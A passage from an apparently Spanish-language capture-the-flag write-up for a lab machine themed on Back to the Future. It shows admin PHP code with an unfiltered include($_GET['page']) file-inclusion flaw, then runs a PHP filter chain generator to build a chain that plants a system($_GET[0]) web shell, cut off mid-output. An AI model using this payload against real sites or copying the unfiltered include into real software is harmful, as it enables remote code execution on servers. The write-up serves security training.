CAgICAgfQ0KDQogICAgICAgICAgICB0byB7DQogICAgICAgICAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgxLjAyKTsNCiAgICAgICAgICAgICAgICBmaWx0ZXI6IGRyb3Atc2hhZG93KDAgMCAxNXB4ICMwMGY3ZmYpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgYS5idXR0b24gew0KICAgICAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOw0KICAgICAgICAgICAgbWFyZ2luLXRvcDogMnJlbTsNCiAgICAgICAgICAgIHBhZGRpbmc6IDAuN3JlbSAxLjVyZW07DQogICAgICAgICAgICBiYWNrZ3JvdW5kOiAjMGUwZTFhOw0KICAgICAgICAgICAgYm9yZGVyOiAycHggc29saWQgI2Y0NDMzNjsNCiAgICAgICAgICAgIGNvbG9yOiAjZjQ0MzM2Ow0KICAgICAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOw0KICAgICAgICAgICAgdHJhbnNpdGlvbjogYWxsIDAuM3MgZWFzZTsNCiAgICAgICAgfQ0KDQogICAgICAgIGEuYnV0dG9uOmhvdmVyIHsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6ICNmNDQzMzY7DQogICAgICAgICAgICBjb2xvcjogI2ZmZjsNCiAgICAgICAgfQ0KICAgIDwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCg0KDQogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4NCiAgICAgICAgPGgxPkFkbWluIFBhbmVsIC0gUmVnaXN0cm8gVGVtcG9yYWw8L2gxPg0KICAgICAgICA8ZGl2IGNsYXNzPSJuYXYiPg0KICAgICAgICAgICAgPGEgaHJlZj0iP3BhZ2U9YWJvdXQucGhwIj5BYm91dDwvYT4NCiAgICAgICAgICAgIDxhIGhyZWY9Ij9wYWdlPWNsb2NrdG93ZXIucGhwIj5DbG9ja3Rvd2VyPC9hPg0KICAgICAgICAgICAgPGEgaHJlZj0iP3BhZ2U9Zmx1eF9jYXBhY2l0b3IucGhwIj5GbHV4IENhcGFjaXRvcjwvYT4NCiAgICAgICAgICAgIDxhIGhyZWY9Ij9wYWdlPWxvZ3MucGhwIj5Mb2dzPC9hPg0KICAgICAgICAgICAgPGEgaHJlZj0iP3BhZ2U9ZG9jX2pvdXJuYWwucGhwIj5Eb2MncyBKb3VybmFsPC9hPg0KICAgICAgICAgICAgPGEgaHJlZj0iP3BhZ2U9dGltZV9tYWNoaW5lLnBocCI+VGltZSBNYWNoaW5lPC9hPg0KICAgICAgICAgICAgPGEgaHJlZj0ibG9nb3V0LnBocCI+TG9nIG91dDwvYT4NCiAgICAgICAgPC9kaXY+DQogICAgDQogICAgICAgIDxkaXYgY2xhc3M9InRlcm1pbmFsIj4NCiAgICAgICAgICAgIDw/cGhwDQogICAgICAgICAgICAgICAgaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKSB7DQogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUoJF9HRVRbJ3BhZ2UnXSk7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgZWNobyAiPHA+QmllbnZlbmlkbyBhbCBwYW5lbCBkZSBhZG1pbmlzdHJhY2nDs24uPC9wPiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgPz4NCiAgICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQoNCiAgICA8c2NyaXB0IHNyYz0ianMvaW5kZXguanMiPjwvc2NyaXB0Pg0KPC9ib2R5Pg0KPC9odG1sPg0K</code></pre></figure></div></div><div data-pane=admin.php class="tab-pane fade" id=tabs--1 role=tabpanel aria-labelledby=tabs--1-tab tabindex=0><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;display_errors&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;logged_in&#39;</span><span class=p>])</span> <span class=o>||</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;logged_in&#39;</span><span class=p>]</span> <span class=o>!==</span> <span class=k>true</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: index.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;!DOCTYPE html&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;html lang=&#34;en&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;head&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;meta charset=&#34;UTF-8&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>    &lt;!-- Se dice que el DeLorean guarda secretos si inspeccionás bien --&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;title&gt;Hill Valley Admin Panel&lt;/title&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;style&gt;
</span></span></span><span class=line><span class=cl><span class=err>        body {
</span></span></span><span class=line><span class=cl><span class=err>            background: #0e0e1a;
</span></span></span><span class=line><span class=cl><span class=err>            color: #00ffcc;
</span></span></span><span class=line><span class=cl><span class=err>            font-family: &#39;Courier New&#39;, Courier, monospace;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        h2 {
</span></span></span><span class=line><span class=cl><span class=err>            margin-bottom: 1rem;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        p {
</span></span></span><span class=line><span class=cl><span class=err>            margin-bottom: .5rem;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        .container {
</span></span></span><span class=line><span class=cl><span class=err>            width: 90%;
</span></span></span><span class=line><span class=cl><span class=err>            margin: 2rem auto;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        .nav {
</span></span></span><span class=line><span class=cl><span class=err>            margin-bottom: 1.5rem;
</span></span></span><span class=line><span class=cl><span class=err>            display: flex;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>        .nav a {
</span></span></span><span class=line><span class=cl><span class=err>            color: #00ffff;
</span></span></span><span class=line><span class=cl><span class=err>            text-decoration: none;
</span></span></span><span class=line><span class=cl><span class=err>            margin-right: 1rem;
</span></span></span><span class=line><span class=cl><span class=err>            padding: .5rem 0;
</span></span></span><span class=line><span class=cl><span class=err>            border-bottom: 1px solid #00ffff;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        .terminal {
</span></span></span><span class=line><span class=cl><span class=err>            background: #000000;
</span></span></span><span class=line><span class=cl><span class=err>            border: 1px solid #00ffcc;
</span></span></span><span class=line><span class=cl><span class=err>            padding: 1rem;
</span></span></span><span class=line><span class=cl><span class=err>            text-wrap: wrap;
</span></span></span><span class=line><span class=cl><span class=err>            word-wrap: wrap;
</span></span></span><span class=line><span class=cl><span class=err>            overflow: hidden;
</span></span></span><span class=line><span class=cl><span class=err>            overflow-wrap: break-word;
</span></span></span><span class=line><span class=cl><span class=err>            display: flex;
</span></span></span><span class=line><span class=cl><span class=err>            flex-direction: column;
</span></span></span><span class=line><span class=cl><span class=err>            justify-content: center;
</span></span></span><span class=line><span class=cl><span class=err>            align-items: center;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        .img {
</span></span></span><span class=line><span class=cl><span class=err>            width: 100%;
</span></span></span><span class=line><span class=cl><span class=err>            max-width: 500px;
</span></span></span><span class=line><span class=cl><span class=err>            display: block;
</span></span></span><span class=line><span class=cl><span class=err>            margin: 0 auto;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        @media (max-width: 768px) {
</span></span></span><span class=line><span class=cl><span class=err>            .time-row {
</span></span></span><span class=line><span class=cl><span class=err>                grid-template-columns: repeat(6, auto);
</span></span></span><span class=line><span class=cl><span class=err>                justify-content: center;
</span></span></span><span class=line><span class=cl><span class=err>            }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>            .time-row .caption {
</span></span></span><span class=line><span class=cl><span class=err>                font-size: 0.9rem;
</span></span></span><span class=line><span class=cl><span class=err>            }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>            .char {
</span></span></span><span class=line><span class=cl><span class=err>                font-size: 1.3rem;
</span></span></span><span class=line><span class=cl><span class=err>            }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>            h1 {
</span></span></span><span class=line><span class=cl><span class=err>                font-size: 2rem;
</span></span></span><span class=line><span class=cl><span class=err>            }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>            .delorean-panel {
</span></span></span><span class=line><span class=cl><span class=err>                padding: 1rem;
</span></span></span><span class=line><span class=cl><span class=err>            }
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        .flux-card {
</span></span></span><span class=line><span class=cl><span class=err>            background: #111;
</span></span></span><span class=line><span class=cl><span class=err>            max-width: 700px;
</span></span></span><span class=line><span class=cl><span class=err>            margin: auto;
</span></span></span><span class=line><span class=cl><span class=err>            padding: 2rem;
</span></span></span><span class=line><span class=cl><span class=err>            border-radius: 12px;
</span></span></span><span class=line><span class=cl><span class=err>            box-shadow: 0 0 20px #00f7ff55;
</span></span></span><span class=line><span class=cl><span class=err>            border: 2px dashed #fbbc05;
</span></span></span><span class=line><span class=cl><span class=err>            display: flex;
</span></span></span><span class=line><span class=cl><span class=err>            flex-direction: column;
</span></span></span><span class=line><span class=cl><span class=err>            justify-content: center;
</span></span></span><span class=line><span class=cl><span class=err>            align-items: center;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        .flux-img {
</span></span></span><span class=line><span class=cl><span class=err>            margin: 1rem auto;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        .flux-img img {
</span></span></span><span class=line><span class=cl><span class=err>            max-width: 100%;
</span></span></span><span class=line><span class=cl><span class=err>            width: 300px;
</span></span></span><span class=line><span class=cl><span class=err>            filter: drop-shadow(0 0 10px #00f7ff);
</span></span></span><span class=line><span class=cl><span class=err>            transition: all 0.3s ease;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        .flux-img.active img {
</span></span></span><span class=line><span class=cl><span class=err>            animation: pulse 1.2s infinite alternate;
</span></span></span><span class=line><span class=cl><span class=err>            filter: drop-shadow(0 0 20px #00f7ff);
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        .flux-text {
</span></span></span><span class=line><span class=cl><span class=err>            color: #7CFC00;
</span></span></span><span class=line><span class=cl><span class=err>            font-size: 1.1rem;
</span></span></span><span class=line><span class=cl><span class=err>            line-height: 1.6;
</span></span></span><span class=line><span class=cl><span class=err>            margin-top: 1.5rem;
</span></span></span><span class=line><span class=cl><span class=err>            animation: appearText 1s ease-in-out;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        .switch {
</span></span></span><span class=line><span class=cl><span class=err>            margin-top: 2rem;
</span></span></span><span class=line><span class=cl><span class=err>            display: inline-block;
</span></span></span><span class=line><span class=cl><span class=err>            position: relative;
</span></span></span><span class=line><span class=cl><span class=err>            width: 60px;
</span></span></span><span class=line><span class=cl><span class=err>            height: 34px;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        .switch input {
</span></span></span><span class=line><span class=cl><span class=err>            opacity: 0;
</span></span></span><span class=line><span class=cl><span class=err>            width: 0;
</span></span></span><span class=line><span class=cl><span class=err>            height: 0;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        .slider {
</span></span></span><span class=line><span class=cl><span class=err>            position: absolute;
</span></span></span><span class=line><span class=cl><span class=err>            cursor: pointer;
</span></span></span><span class=line><span class=cl><span class=err>            top: 0;
</span></span></span><span class=line><span class=cl><span class=err>            left: 0;
</span></span></span><span class=line><span class=cl><span class=err>            right: 0;
</span></span></span><span class=line><span class=cl><span class=err>            bottom: 0;
</span></span></span><span class=line><span class=cl><span class=err>            background-color: #444;
</span></span></span><span class=line><span class=cl><span class=err>            border-radius: 34px;
</span></span></span><span class=line><span class=cl><span class=err>            transition: 0.4s;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        .slider:before {
</span></span></span><span class=line><span class=cl><span class=err>            position: absolute;
</span></span></span><span class=line><span class=cl><span class=err>            content: &#34;&#34;;
</span></span></span><span class=line><span class=cl><span class=err>            height: 26px;
</span></span></span><span class=line><span class=cl><span class=err>            width: 26px;
</span></span></span><span class=line><span class=cl><span class=err>            left: 4px;
</span></span></span><span class=line><span class=cl><span class=err>            bottom: 4px;
</span></span></span><span class=line><span class=cl><span class=err>            background-color: #f44336;
</span></span></span><span class=line><span class=cl><span class=err>            border-radius: 50%;
</span></span></span><span class=line><span class=cl><span class=err>            transition: 0.4s;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        .switch input:checked+.slider {
</span></span></span><span class=line><span class=cl><span class=err>            background-color: #7CFC00;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        .switch input:checked+.slider:before {
</span></span></span><span class=line><span class=cl><span class=err>            transform: translateX(26px);
</span></span></span><span class=line><span class=cl><span class=err>            background-color: #7CFC00;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        @keyframes appearText {
</span></span></span><span class=line><span class=cl><span class=err>            from {
</span></span></span><span class=line><span class=cl><span class=err>                opacity: 0;
</span></span></span><span class=line><span class=cl><span class=err>                transform: translateY(10px);
</span></span></span><span class=line><span class=cl><span class=err>            }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>            to {
</span></span></span><span class=line><span class=cl><span class=err>                opacity: 1;
</span></span></span><span class=line><span class=cl><span class=err>                transform: translateY(0);
</span></span></span><span class=line><span class=cl><span class=err>            }
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        @keyframes pulse {
</span></span></span><span class=line><span class=cl><span class=err>            from {
</span></span></span><span class=line><span class=cl><span class=err>                transform: scale(1);
</span></span></span><span class=line><span class=cl><span class=err>                filter: drop-shadow(0 0 5px #00f7ff);
</span></span></span><span class=line><span class=cl><span class=err>            }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>            to {
</span></span></span><span class=line><span class=cl><span class=err>                transform: scale(1.02);
</span></span></span><span class=line><span class=cl><span class=err>                filter: drop-shadow(0 0 15px #00f7ff);
</span></span></span><span class=line><span class=cl><span class=err>            }
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        a.button {
</span></span></span><span class=line><span class=cl><span class=err>            display: inline-block;
</span></span></span><span class=line><span class=cl><span class=err>            margin-top: 2rem;
</span></span></span><span class=line><span class=cl><span class=err>            padding: 0.7rem 1.5rem;
</span></span></span><span class=line><span class=cl><span class=err>            background: #0e0e1a;
</span></span></span><span class=line><span class=cl><span class=err>            border: 2px solid #f44336;
</span></span></span><span class=line><span class=cl><span class=err>            color: #f44336;
</span></span></span><span class=line><span class=cl><span class=err>            text-decoration: none;
</span></span></span><span class=line><span class=cl><span class=err>            transition: all 0.3s ease;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        a.button:hover {
</span></span></span><span class=line><span class=cl><span class=err>            background: #f44336;
</span></span></span><span class=line><span class=cl><span class=err>            color: #fff;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>    &lt;/style&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/head&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;body&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>    &lt;div class=&#34;container&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;h1&gt;Admin Panel - Registro Temporal&lt;/h1&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;div class=&#34;nav&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>            &lt;a href=&#34;?page=about.php&#34;&gt;About&lt;/a&gt;
</span></span></span><span class=line><span class=cl><span class=err>            &lt;a href=&#34;?page=clocktower.php&#34;&gt;Clocktower&lt;/a&gt;
</span></span></span><span class=line><span class=cl><span class=err>            &lt;a href=&#34;?page=flux_capacitor.php&#34;&gt;Flux Capacitor&lt;/a&gt;
</span></span></span><span class=line><span class=cl><span class=err>            &lt;a href=&#34;?page=logs.php&#34;&gt;Logs&lt;/a&gt;
</span></span></span><span class=line><span class=cl><span class=err>            &lt;a href=&#34;?page=doc_journal.php&#34;&gt;Doc&#39;s Journal&lt;/a&gt;
</span></span></span><span class=line><span class=cl><span class=err>            &lt;a href=&#34;?page=time_machine.php&#34;&gt;Time Machine&lt;/a&gt;
</span></span></span><span class=line><span class=cl><span class=err>            &lt;a href=&#34;logout.php&#34;&gt;Log out&lt;/a&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        &lt;div class=&#34;terminal&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>            &lt;?php
</span></span></span><span class=line><span class=cl><span class=err>                if (isset($_GET[&#39;page&#39;])) {
</span></span></span><span class=line><span class=cl><span class=err>                    include($_GET[&#39;page&#39;]);
</span></span></span><span class=line><span class=cl><span class=err>                } else {
</span></span></span><span class=line><span class=cl><span class=err>                    echo &#34;&lt;p&gt;Bienvenido al panel de administración.&lt;/p&gt;&#34;;
</span></span></span><span class=line><span class=cl><span class=err>                }
</span></span></span><span class=line><span class=cl><span class=err>            ?&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>    &lt;script src=&#34;js/index.js&#34;&gt;&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/body&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/html&gt;
</span></span></span></code></pre></div></figure></div><p>Ahí podemos identificar el campo vulnerable <code>include($_GET['page']);</code> ya que recoge nuestro input y no pasa por ningún tipo de filtro ni sanitización, luego con la función <a href=https://www.php.net/manual/es/function.include.php>include</a> incluyendo el fichero apuntado y recogido por el parámetro <code>page</code>.</p></div></div><p>Bien sabiendo que podemos usar <code>PHP Wrappers</code>, para lograr un RCE vamos a usar el siguiente repositorio:</p><div class="card-nav d-flex flex-column flex-sm-row"><div class="card text-end w-100"><div class="card-body d-flex"><div class="d-flex flex-column me-auto text-start"><h5 class="card-title my-0"><a href=https://github.com/synacktiv/php_filter_chain_generator target=_blank class="stretched-link text-reset text-decoration-none">PHP filter chain generator</a></h5><p class="card-text mt-1">A CLI to generate PHP filters chain, get your RCE without uploading a file if you control entirely the parameter passed to a require or an include in PHP!</p></div><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M13 18l6-6"/><path d="M13 6l6 6"/></svg></div></div></div></div><p>Vamos a usar el <code>php_filter_chain_generator.py</code>, para ello vamos a seguir la siguiente sintaxis compartida en el repositorio como ejemplo:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ python3 php_filter_chain_generator.py --chain <span class=s1>&#39;&lt;?php phpinfo(); ?&gt;  &#39;</span></span></span></code></pre></div></figure></div><p>Vamos a emplearlo:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>pylon㉿kali<span class=o>)</span>-<span class=o>[</span>~/…/pylon/THL/BackToTheFuture/content<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ python3 php_filter_chain_generator.py --chain <span class=s1>&#39;&lt;?php system($_GET[0]);?&gt;&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> The following gadget chain will generate the following code : &lt;?php system<span class=o>(</span><span class=nv>$_GET</span><span class=o>[</span>0<span class=o>])</span><span class=p>;</span>?&gt; <span class=o>(</span>base64 value: PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg<span class=o>)</span>
</span></span><span class=line><span class=cl>php://filter/convert.iconv.UTF8.CSISO2022KR<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM921.NAPLPS<span class=p>|</span>convert.iconv.855.CP936<span class=p>|</span>convert.iconv.IBM-932.UTF-8<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM1161.IBM-932<span class=p>|</span>convert.iconv.MS932.MS936<span class=p>|</span>convert.iconv.BIG5.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.IBM869.UTF16<span class=p>|</span>convert.iconv.L3.CSISO90<span class=p>|</span>convert.iconv.UCS2.UTF-8<span class=p>|</span>convert.iconv.CSISOLATIN6.UCS-4<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.IBM869.UTF16<span class=p>|</span>convert.iconv.L3.CSISO90<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.L6.UNICODE<span class=p>|</span>convert.iconv.CP1282.ISO-IR-90<span class=p>|</span>convert.iconv.CSA_T500.L4<span class=p>|</span>convert.iconv.ISO_8859-2.ISO-IR-103<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.863.UTF-16<span class=p>|</span>convert.iconv.ISO6937.UTF16LE<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.INIS.UTF16<span class=p>|</span>convert.iconv.CSIBM1133.IBM943<span class=p>|</span>convert.iconv.GBK.BIG5<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CP861.UTF-16<span class=p>|</span>convert.iconv.L4.GB13000<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.865.UTF16<span class=p>|</span>convert.iconv.CP901.ISO6937<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM1161.IBM-932<span class=p>|</span>convert.iconv.MS932.MS936<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.INIS.UTF16<span class=p>|</span>convert.iconv.CSIBM1133.IBM943<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CP861.UTF-16<span class=p>|</span>convert.iconv.L4.GB13000<span class=p>|</span>convert.iconv.BIG5.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.UTF8.UTF16LE<span class=p>|</span>convert.iconv.UTF8.CSISO2022KR<span class=p>|</span>convert.iconv.UCS2.UTF8<span class=p>|</span>convert.iconv.8859_3.UCS2<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.PT.UTF32<span class=p>|</span>convert.iconv.KOI8-U.IBM-932<span class=p>|</span>convert.iconv.SJIS.EUCJP-WIN<span class=p>|</span>convert.iconv.L10.UCS4<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CP367.UTF-16<span class=p>|</span>convert.iconv.CSIBM901.SHIFT_JISX0213<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.PT.UTF32<span class=p>|</span>convert.iconv.KOI8-U.IBM-932<span class=p>|</span>convert.iconv.SJIS.EUCJP-WIN<span class=p>|</span>convert.iconv.L10.UCS4<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.UTF8.CSISO2022KR<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.863.UTF-16<span class=p>|</span>convert.iconv.ISO6937.UTF16LE<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.864.UTF32<span class=p>|</span>convert.iconv.IBM912.NAPLPS<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CP861.UTF-16<span class=p>|</span>convert.iconv.L4.GB13000<span class=p>|</span>convert.iconv.BIG5.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.L6.UNICODE<span class=p>|</span>convert.iconv.CP1282.ISO-IR-90<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.INIS.UTF16<span class=p>|</span>convert.iconv.CSIBM1133.IBM943<span class=p>|</span>convert.iconv.GBK.BIG5<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.865.UTF16<span class=p>|</span>convert.iconv.CP901.ISO6937<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CP-AR.UTF16<span 